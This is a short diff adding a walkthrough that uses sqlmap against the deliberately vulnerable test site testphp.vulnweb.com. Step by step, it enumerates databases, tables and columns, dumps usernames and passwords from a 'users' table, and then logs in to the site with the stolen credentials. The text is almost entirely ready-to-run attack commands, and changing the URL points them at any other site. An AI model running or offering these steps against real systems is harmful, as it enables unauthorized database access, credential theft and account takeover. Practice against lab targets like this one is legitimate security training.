@@ -1,0 +1,13 @@
+1) Run commands in kali terminal:
+example.com="http://testphp.vulnweb.com/listproducts.php?cat=1"
+> sqlmap -u example.com --dbs
+-----Displays DB info---------
+> sqlmap -u example.com -D acuart --tables [// DB="acuart"]
+----Dispalys tables list-----
+> sqlmap -u example.com -D acuart -T users --columns 
+----Dispalys coulmns list-----
+> sqlmap -u example.com -D acuart -T users -C uname,pass --dump [// For usernames and passwords]
+----Dispalys credential list-----
+
+2) Goto target website -example.com- and try login with above fetched credentials.
+------LOGIN SUCCESS--------
